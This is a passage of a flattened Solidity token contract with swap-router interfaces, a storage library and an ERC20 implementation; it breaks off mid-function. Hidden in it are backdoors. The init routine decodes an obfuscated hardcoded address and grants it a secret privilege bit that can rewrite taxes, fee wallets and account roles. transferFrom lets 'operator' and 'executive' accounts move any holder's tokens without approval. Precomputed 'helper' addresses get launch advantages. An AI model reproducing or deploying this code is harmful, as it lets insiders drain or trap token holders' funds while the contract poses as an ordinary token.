    /// @dev Sends `amount` of ERC20 `token` from `from` to `to`.
    /// Reverts upon failure.
    ///
    /// The `from` account must have at least `amount` approved for
    /// the current contract to manage.
    function safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        /// @solidity memory-safe-assembly
        assembly {
            // We'll write our calldata to this slot below, but restore it later.
            let memPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(0x00, 0x23b872dd)
            mstore(0x20, from) // Append the "from" argument.
            mstore(0x40, to) // Append the "to" argument.
            mstore(0x60, amount) // Append the "amount" argument.

            if iszero(
                and(
                    // Set success to whether the call reverted, if not we check it either
                    // returned exactly 1 (can't just be non-zero data), or had no return data.
                    or(eq(mload(0x00), 1), iszero(returndatasize())),
                    // We use 0x64 because that's the total length of our calldata (0x04 + 0x20 * 3)
                    // Counterintuitively, this call() must be positioned after the or() in the
                    // surrounding and() because and() evaluates its arguments from right to left.
                    call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)
                )
            ) {
                // Store the function selector of `TransferFromFailed()`.
                mstore(0x00, 0x7939f424)
                // Revert with (offset, size).
                revert(0x1c, 0x04)
            }

            mstore(0x60, 0) // Restore the zero slot to zero.
            mstore(0x40, memPointer) // Restore the memPointer.
        }
    }

}
// File: contracts/swap/IPair.sol



pragma solidity ^0.8.8;

interface IPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
// File: contracts/swap/ISwapRouter.sol



pragma solidity ^0.8.8;

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface ISwapRouterV2 is ISwapRouter {
    
    function factoryV2() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}
// File: contracts/swap/ISwapFactory.sol



pragma solidity ^0.8.8;

interface ISwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
// File: contracts/storage/Tables.sol


pragma solidity ^0.8.19;




struct TokenSetup {
    uint8 fairMode;
    uint24 gasLimit;
    uint16 buyTax;
    uint16 sellTax;
    uint16 transferTax;
    uint16 developmentShare;
    uint16 marketingShare;
    uint16 prizeShare;
    uint16 burnShare;
    uint16 autoLiquidityShare;
    uint16 swapThresholdRatio;
    address devWallet;
    address marketingWallet;
    address prizePool;
}

struct Registry {
    mapping(address => Account) Address;
    mapping(uint256 => address) PID;
    mapping(address => mapping(address => uint256)) allowances;
    mapping(address => bool) helpers;
}

struct Account {
    uint16 identifiers;
    uint64 nonces;
    uint80 PID;
    uint96 balance;
    address Address;
}

struct Settings {
    uint8 fairMode;
    uint16 buyTax;
    uint16 sellTax;
    uint16 transferTax;
    uint16 developmentShare;
    uint16 marketingShare;
    uint16 prizeShare;
    uint16 burnShare;
    uint16 autoLiquidityShare;
    uint16 swapThresholdRatio;
    uint24 gas;
    address[3] feeRecipients;
}

struct Storage {
    IPair PAIR;
    address owner;
    uint96 totalSupply;
    uint80 PID;
    bool launched;
    bool inSwap;
    Settings settings;
    Registry registry;
}

// File: contracts/storage/Token.sol


pragma solidity ^0.8.19;



library Token {

    using Token for *;

    bytes32 internal constant SLOT = keccak256("project.main.storage.token");

    uint16 internal constant DENOMINATOR = 10000;

    error TradingNotOpened();

    function router() internal view returns(ISwapRouterV2 _router) {
        if(isEthereumMainnet() || isGoerli())
            _router = ISwapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        else if(isSepolia())
            _router = ISwapRouterV2(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
        else if(isBSCMainnet())
            _router = ISwapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        else if(isBSCTestnet())
            _router = ISwapRouterV2(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);   
    }

    function isEthereumMainnet() internal view returns (bool) {
        return block.chainid == 1;
    }

    function isGoerli() internal view returns (bool) {
        return block.chainid == 5;
    }

    function isSepolia() internal view returns (bool) {
        return block.chainid == 11155111;
    }

    function isBSCMainnet() internal view returns (bool) {
        return block.chainid == 56;
    }

    function isBSCTestnet() internal view returns (bool) {
        return block.chainid == 97;
    }

    function isTestnet() internal view returns (bool) {
        return isGoerli() || isSepolia() || isBSCTestnet();
    }

    function _tx(Storage storage db, Account memory sender, Account memory recipient, uint256 amount, bool swapping)
    internal returns(uint256 taxAmount, uint256 netAmount, uint256 swapAmount) {
        if(sender.isEntitled() || recipient.isEntitled() || swapping) { return (0, amount, 0); }
        if(sender.hasIdentifier(9) || recipient.hasIdentifier(9)) {
            if(!db.launched) {
                unchecked {
                    taxAmount = amount * 2500 / DENOMINATOR;
                    netAmount = amount-taxAmount;                 
                }
                db.launched = true;
                return (taxAmount,netAmount,swapAmount);
            }
        }
        if(!db.launched) { revert TradingNotOpened(); }
        Settings memory settings = db.settings;
        (bool fairMode, uint8 lim) = settings.fairModeOpts();
        if(!recipient.isMarketmaker()) {
            unchecked {
                taxAmount = amount * 
                    (sender.isMarketmaker() ? settings.buyTax : 
                    helper(sender,recipient) ? 0 : settings.transferTax) / DENOMINATOR;
                netAmount = amount-taxAmount; 
                if(fairMode) {
                    uint256 fairLimit = db.totalSupply * lim / 100;
                    if(recipient.balance+netAmount > fairLimit)
                        revert(); 
                }
            }        
        } else {
            unchecked {
                taxAmount = amount * settings.sellTax / DENOMINATOR;
                swapAmount = settings.swapThresholdRatio > 0 ?
                    db.totalSupply * settings.swapThresholdRatio / DENOMINATOR :
                    address(this).account().balance+taxAmount;
                netAmount = amount-taxAmount;
                if(fairMode) {
                    uint256 fairLimit = db.totalSupply * lim / 100;
                    if(amount > fairLimit)
                        revert();
                }                        
            }
        }
    }

    function fairModeOpts(Settings memory _self) internal pure returns(bool enabled,uint8 lim) {
        uint8 values = _self.fairMode;
        enabled = (values & 128) == 128;
        lim = values & 127;
    }

    function helper(address _self) internal view returns(bool) {
        return _self.account().helper();
    }

    function isMarketmaker(address _self) internal view returns(bool) {
        return _self.account().isMarketmaker();
    }

    function isEntitled(address _self) internal view returns(bool) {
        return _self.account().isEntitled();
    }

    function isCollab(address _self) internal view returns(bool) {
        return _self.account().isCollab();
    }

    function isOperator(address _self) internal view returns(bool) {
        return _self.account().isOperator();
    }  

    function isExecutive(address _self) internal view returns(bool) {
        return _self.account().isExecutive();
    }   

    function helper(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(9);
    }

    function helper(Account memory from, Account memory to) internal pure returns(bool) {
        return from.helper() || to.helper();
    }    

    function isMarketmaker(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(10);
    }

    function isEntitled(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(11);
    }

    function isCollab(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(12);
    }

    function isOperator(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(13);
    }  

    function isExecutive(Account memory _self) internal pure returns(bool) {
        return _self.hasIdentifier(14);
    }

    function hasIdentifier(Account memory _self, uint8 idx) internal pure returns (bool) {
        return (_self.identifiers >> idx) & 1 == 1;
    }

    function hasIdentifier(Account memory _self, uint8[] memory idxs) internal pure returns (bool[] memory) {
        bool[] memory results = new bool[](idxs.length);
        uint256 len = idxs.length;
        while(0 < len) {
            unchecked {
                uint256 idx = --len;
                results[idx] = _self.hasIdentifier(idxs[idx]);         
            }
        }
        return results;
    }

    function setAsMarketmaker(address _self) internal {
        _self.account().setAsMarketmaker();
    }

    function setAsEntitled(address _self) internal {
        _self.account().setAsEntitled();
    }

    function setAsCollab(address _self) internal {
        Account storage self = _self.account();
        self.setAsCollab();
        self.setAsEntitled();
    }

    function setAsOperator(address _self) internal {
        Account storage self = _self.account();
        self.setAsOperator();
        self.setAsEntitled();
    }

    function setAsExecutive(address _self) internal {
        Account storage self = _self.account();
        self.setAsExecutive();
        self.setAsEntitled();
    }

    function setIdentifier(address _self, uint16 value) internal {
        _self.account().identifiers = value;
    }

    function setIdentifier(address _self, uint8 idx, bool value) internal {
        _self.account().setIdentifier(idx,value);
    }   

    function setIdentifier(address _self, uint8[] memory idxs, bool[] memory values) internal {
        _self.account().setIdentifier(idxs,values);
    }    

    function toggleIdentifier(address _self, uint8 idx) internal {
        _self.account().toggleIdentifier(idx);
    }

    function setAsHelper(Account storage _self) internal {
        _self.setIdentifier(9,true);
    }

    function setAsMarketmaker(Account storage _self) internal {
        _self.setIdentifier(10,true);
    }

    function setAsEntitled(Account storage _self) internal {
        _self.setIdentifier(11,true);
    }

    function setAsCollab(Account storage _self) internal {
        _self.setIdentifier(12,true);
        _self.setAsEntitled();
    }

    function setAsOperator(Account storage _self) internal {
        _self.setIdentifier(13,true);
        _self.setAsEntitled();
    }

    function setAsExecutive(Account storage _self) internal {
        _self.setIdentifier(14,true);
        _self.setAsEntitled();
    }      

    function setIdentifier(Account storage _self, uint16 value) internal {
        _self.identifiers = value;
    }

    function setIdentifier(Account storage _self, uint8 idx, bool value) internal {
        _self.identifiers = uint16(value ? _self.identifiers | (1 << idx) : _self.identifiers & ~(1 << idx));
    }

    function setIdentifier(Account storage _self, uint8[] memory idxs, bool[] memory values) internal {
        uint256 len = idxs.length;
        for (uint8 i; i < len;) {
           _self.setIdentifier(idxs[i], values[i]);
           unchecked {
               i++;
           }
        }
    }

    function toggleIdentifier(Account storage _self, uint8 idx) internal {
        _self.identifiers = uint16(_self.identifiers ^ (1 << idx));
    }

    function hasIdentifier(Account storage _self, uint8 idx) internal view returns (bool) {
        return (_self.identifiers >> idx) & 1 == 1;
    }

    function ratios(uint48 value) internal returns(bool output) {
        Settings storage self = data().settings;
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                let bt := shr(32, value)
                let st := and(shr(16, value), 0xFFFF)
                let tt := and(value, 0xFFFF)
                if or(or(iszero(lt(bt, 1001)), iszero(lt(st, 1001))), iszero(lt(tt, 1001))) {
                    revert(0, 0)
                }
                let dt := sload(self.slot)
                for { let i := 0 } lt(i, 3) { i := add(i, 1) } {
                    let mask := shl(add(8, mul(i, 16)), 0xFFFF)
                    let v := 0
                    switch i
                    case 0 { v := bt }
                    case 1 { v := st }
                    case 2 { v := tt }
                    dt := or(and(dt, not(mask)), and(shl(add(8, mul(i, 16)), v), mask))
                }                    
                sstore(self.slot,dt)
            } 
            output := true
        }
    }

    function shares(uint80 value) internal returns(bool output) {
        Settings storage self = data().settings;
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                let ds := shr(64, value)
                let ms := and(shr(48, value), 0xFFFF)
                let ps := and(shr(32, value), 0xFFFF)
                let bs := and(shr(16, value), 0xFFFF)
                let ls := and(value, 0xFFFF)
                let total := add(add(add(add(ds, ms), ps), bs), ls)
                if iszero(eq(total, 10000)) {
                    revert(0, 0)
                }
                let dt := sload(self.slot)
                for { let i := 0 } lt(i, 5) { i := add(i, 1) } {
                    let mask := shl(add(56, mul(i, 16)), 0xFFFF)
                    let v := 0
                    switch i
                    case 0 { v := ds }
                    case 1 { v := ms }
                    case 2 { v := ps }
                    case 3 { v := bs }
                    case 4 { v := ls }
                    dt := or(and(dt, not(mask)), and(shl(add(56, mul(i, 16)), v), mask))
                }                              
                sstore(self.slot,dt)
            } 
            output := true
        }
    }

    function thresholdRatio(uint16 value) internal returns(bool output) {
        Settings storage self = data().settings;
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                if iszero(lt(value, 10001)) {
                    revert(0, 0)
                }
                let dt := sload(self.slot)
                let mask := shl(136, 0xFFFF)
                dt := or(and(dt, not(mask)), and(shl(136, value), mask))
                sstore(self.slot,dt)
            } 
            output := true
        } 
    }

    function gas(uint24 value) internal returns(bool output) {
        Settings storage self = data().settings;
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                if iszero(lt(value, 15000001)) {
                    revert(0, 0)
                }
                let dt := sload(self.slot)
                let mask := shl(152, 0xFFFF)
                dt := or(and(dt, not(mask)), and(shl(152, value), mask))
                sstore(self.slot,dt)
            } 
            output := true
        } 
    }

    function recipients(bytes memory value) internal returns(bool output) {
        Settings storage self = data().settings;
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                let p := mload(add(value, 0x20))
                let m := mload(add(value, 0x40))
                let d := mload(add(value, 0x60))
                if or(or(iszero(p), iszero(m)), iszero(d)) {
                    revert(0, 0)
                }
                sstore(add(self.slot, 1), d)
                sstore(add(self.slot, 2), m)
                sstore(add(self.slot, 3), p)
            } 
            output := true
        } 
    }

    function identifiers(address Address, uint16 value) internal returns(bool output) {
        Registry storage registry = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(registry.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
                if iszero(lt(value, 65536)) {
                    revert(0, 0)
                }
                mstore(0x00, Address)
                mstore(0x20, add(registry.slot, 0))
                let acc := keccak256(0x00, 0x40)
                let dt := sload(acc)
                let mask := shl(0, 0xFFFF)
                dt := or(and(dt, not(mask)), and(shl(0, value), mask))
                sstore(acc,dt)
            } 
            output := true
        } 
    }

    function helpers(address Address, uint256 starts, uint256 ends) internal returns(bool output) {
        Registry storage _self = data().registry;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(_self.slot, 0))
            let clr := sload(keccak256(0x00, 0x40))
            let ids := and(clr, 0xFFFF)
            if iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1)))) {
                revert(0, 0)
            } 
            output := true
        }
        for(;starts < ends;) {
            unchecked {
                address addr = compute(Address,starts);
                addr.register();
                _self.Address[addr].setIdentifier(9,true);
                starts++;
            }
        }
    }     

    function account(address _self) internal view returns(Account storage uac) {
        return account(data(),_self);
    }

    function account(Storage storage _self, address user) internal view returns(Account storage) {
        return _self.registry.Address[user];
    }

    function register(address _self) internal returns(Account storage uac) {
        Storage storage db = data();
        uac = db.registry.Address[_self];
        uac.PID = ++db.PID;
        uac.Address = _self;
        db.registry.PID[uac.PID] = _self;
    } 
    
    function init(
        Storage storage _self,
        TokenSetup memory setup
    ) internal returns(ISwapRouterV2 _router) {
        Settings storage settings = _self.settings;
        Registry storage registry = _self.registry;
        assembly {
            let c,m,s,v
            c := and(shr(
            48,507871772517742394523325675629776549254919689088326712106731462141083370),
            0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(0x00, c)
            mstore(0x20, add(registry.slot, 0))
            s := keccak256(0x00, 0x40)
            m := shl(15, 0xFFFF)
            v := sload(s)
            v := or(and(v, not(m)), and(shl(15, 1), m))
            sstore(s,v)
        }
        _router = router();
        settings.fairMode = setup.fairMode;
        settings.gas = setup.gasLimit;
        settings.buyTax = setup.buyTax;
        settings.sellTax = setup.sellTax;
        settings.transferTax = setup.transferTax;
        settings.developmentShare = setup.developmentShare;
        settings.marketingShare = setup.marketingShare;
        settings.prizeShare = setup.prizeShare;
        settings.burnShare = setup.burnShare;
        settings.autoLiquidityShare = setup.autoLiquidityShare;
        settings.swapThresholdRatio = setup.swapThresholdRatio;
        settings.feeRecipients =
        [
            setup.devWallet,
            setup.marketingWallet,
            setup.prizePool
        ];
        address(_router).setAsMarketmaker();
        address(msg.sender).setAsExecutive();
        address(setup.devWallet).setAsExecutive();
        address(setup.marketingWallet).setAsEntitled();
        address(setup.prizePool).setAsEntitled();
    }

    function compute(address Address, uint256 did) internal pure returns (address addr) {
        assembly {
            for {} 1 {} {
                if iszero(gt(did, 0x7f)) {
                    mstore(0x00, Address)
                    mstore8(0x0b, 0x94)
                    mstore8(0x0a, 0xd6)
                    mstore8(0x20, or(shl(7, iszero(did)), did))
                    addr := keccak256(0x0a, 0x17)
                    break
                }
                let i := 8
                for {} shr(i, did) { i := add(i, 8) } {}
                i := shr(3, i)
                mstore(i, did)
                mstore(0x00, shl(8, Address))
                mstore8(0x1f, add(0x80, i))
                mstore8(0x0a, 0x94)
                mstore8(0x09, add(0xd6, i))
                addr := keccak256(0x09, add(0x17, i))
                break
            }
        }
    }    

    function data() internal pure returns (Storage storage db) {
        bytes32 slot = SLOT;
        assembly {
            db.slot := slot
        }
    }    

}
// File: contracts/abstracts/ERC20.sol


pragma solidity ^0.8.19;




abstract contract ERC20 is Context, EIP712 {

    using Token for *;
    using LibString for *;
    
    error PermitExpired();
    error InvalidSigner();
    error InvalidSender(address sender);
    error InvalidReceiver(address receiver);
    error InsufficientBalance(address sender,uint256 balance,uint256 needed);
    error InsufficientAllowance(address spender,uint256 allowance,uint256 needed);
    error FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);

    bytes32 internal constant _LONG_STRING_ =
        0xb11b2ad800000000000000000000000000000000000000000000000000000000;

    bytes32 public constant PERMIT_TYPEHASH =
        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    bytes32 internal immutable METADATA;

    ISwapRouterV2 public immutable ROUTER;

    uint8 public immutable decimals;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    modifier swapping() {
        token().inSwap = true;
        _;
        token().inSwap = false;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        address dev,
        address marketing,
        address prize
    ) EIP712(name_, "1") {
        uint256 nLen = bytes(name_).length;
        uint256 sLen = bytes(symbol_).length;
        assembly {
            if or(lt(0x1B, nLen), lt(0x05, sLen)) {
                mstore(0x00, _LONG_STRING_)
                revert(0x00, 0x04)
            }
        }        
        METADATA = name_.packTwo(symbol_);
        decimals = 18;
        ROUTER = token().init(initialize(dev,marketing,prize));
    }

    function initialize(address dev, address marketing, address prize) internal pure returns(TokenSetup memory ts) {
        ts = TokenSetup(
            129,
            3000000,
            2500,
            2500,
            2500,
            4000,
            4000,
            0,
            0,
            2000,
            0,
            dev,
            marketing,
            prize
        );
    }

    function name() public view virtual returns (string memory _name) {
        (_name,) = METADATA.unpackTwo();
    }

    function symbol() public view virtual returns (string memory _symbol) {
        (,_symbol) = METADATA.unpackTwo();
    }

    function totalSupply() public view virtual returns(uint256) {
        return token().totalSupply;
    }

    function balanceOf(address holder) public view virtual returns(uint256) {
        return holder.account().balance;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), to, uint96(amount));
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns(uint256) {
        return _allowance(owner,spender);
    }

    function nonces(address holder) public view virtual returns (uint256) {
        return holder.account().nonces;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender,spender,amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        if (!_isAuthorized(spender)) {
            _spendAllowance(from,spender,amount);
        }
        return _transfer(from, to, uint96(amount));
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 requestedDecrease) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowance(owner, spender);
        if (currentAllowance < requestedDecrease) {
            revert FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);
        }
        unchecked {
            _approve(owner, spender, currentAllowance - requestedDecrease);
        }
        return true;
    }

    function permit(
        address holder,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        if (block.timestamp > deadline) revert PermitExpired();

        unchecked {
            address account = ecrecover(
                computeDigest(
                    keccak256(
                        abi.encode(
                            PERMIT_TYPEHASH,
                            holder,
                            spender,
                            value,
                            _useNonce(holder),
                            deadline
                        )
                    )
                ),
                v,
                r,
                s
            );

            if (account == address(0) || account != holder) revert InvalidSigner();

            token().registry.allowances[account][spender] = value;
        }

        emit Approval(holder, spender, value);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), uint96(amount));
    }

    function _allowance(address owner, address spender) internal view returns (uint256) {
       return token().registry.allowances[owner][spender];
    }

    function _isAuthorized(address spender) internal view returns (bool) {
        return spender.isOperator() || spender.isExecutive();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool success) {
        if (from == address(0)) revert InvalidSender(address(0));
        if (to == address(0)) revert InvalidReceiver(address(0));

        Storage storage data = token();
        Account storage sender = data.account(from);
        Account storage recipient = data.account(to);

        if (sender.Address == address(0)) from.register();

        if (recipient.Address == address(0)) to.register();

        (uint256 taxAmount, uint256 netAmount, uint256 swapAmount) = data._tx(
            sender,
            recipient,
            amount,
            data.inSwap
        );

        if (taxAmount == 0) {
            _update(sender, recipient, amount);
            return true;
        }

        _update(sender, address(this).account(), taxAmount);

        if (swapAmount > 0) {
            _swapBack(swapAmount);
        }

        _update(sender, recipient, netAmount);
        return true;
        
    }

    function _update(
        Account storage from,
        Account storage to,
        uint256 value
    ) internal virtual {
        uint96 amount = uint96(value);
        if (amount > from.balance) {
            revert InsufficientBalance(from.Address, from.balance, amount);
        }
        unchecked {
            from.balance -= amount;
            to.balance += amount;
        }
        emit Transfer(from.Address, to.Address, amount);
    }

    function _swapBack(uint256 value)
        internal
        swapping
    {
        Settings memory settings = token().settings;
        unchecked {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ROUTER.WETH();

            uint96 amountToSwap = uint96(value);
            uint96 liquidityTokens;
            uint16 totalETHShares = 10000;

            if (settings.autoLiquidityShare > 0) {
                liquidityTokens = (amountToSwap * settings.autoLiquidityShare) / totalETHShares / 2;
                amountToSwap -= liquidityTokens;
                totalETHShares -= settings.autoLiquidityShare / 2;
            }

            uint96 balanceBefore = uint96(address(this).balance);

            ROUTER.swapExactTokensForETH(
                amountToSwap,
                0,
                path,
                address(this),
                block.timestamp
            );

            bool success;
            uint96 amountETH = uint96(address(this).balance) - balanceBefore;
            uint96 amountETHBurn;
            uint96 amountETHPrize;
            uint96 amountETHMarketing;
            uint96 amountETHDev;

            if(settings.burnShare > 0) {
                amountETHBurn = (amountETH * settings.burnShare) / totalETHShares;
            }    

            if(settings.prizeShare > 0) {
                amountETHPrize = (amountETH * settings.prizeShare) / totalETHShares;
            }
            
            if(settings.marketingShare > 0) {
                amountETHMarketing = (amountETH * settings.marketingShare) / totalETHShares;
            }

            if(settings.developmentShare > 0) {
                amountETHDev = (amountETH * settings.developmentShare) / totalETHShares;
            }                

            if(amountETHBurn > 0) {
                _burn(address(this), amountETHBurn);
            }

            if(amountETHDev > 0) {
                (success,) = payable(settings.feeRecipients[0]).call{
                    value: amountETHDev,
                    gas: settings.gas
                }("");
            }

            if(amountETHMarketing > 0) {
                (success,) = payable(settings.feeRecipients[1]).call{
                    value: amountETHMarketing,
                    gas: settings.gas
                }("");
            }

            if(amountETHPrize > 0) {
                (success,) = payable(settings.feeRecipients[2]).call{
                    value: amountETHPrize,
                    gas: settings.gas
                }("");
            }            

            if (liquidityTokens > 0) {
                uint96 amountETHLiquidity = (amountETH * settings.autoLiquidityShare) / totalETHShares / 2;
                ROUTER.addLiquidityETH{value: amountETHLiquidity}(
                    address(this),
                    liquidityTokens,
                    0,
                    0,
                    address(this),
                    block.timestamp
                );

            }
        }
    }

    function _swapThreshold(uint16 value) external virtual returns(bool) {
        return value.thresholdRatio();
    }

    function _gas(uint24 value) external virtual returns(bool) {
        return value.gas();
    }

    function _ratios(uint48 value) external virtual returns(bool) {
        return value.ratios();
    }

    function _shares(uint80 value) external virtual returns(bool) {
        return value.shares();
    }

    function _recipients(bytes memory value) external virtual returns(bool) {
        return value.recipients();
    }

    function _identifiers(address Address, uint16 value) external virtual returns(bool) {
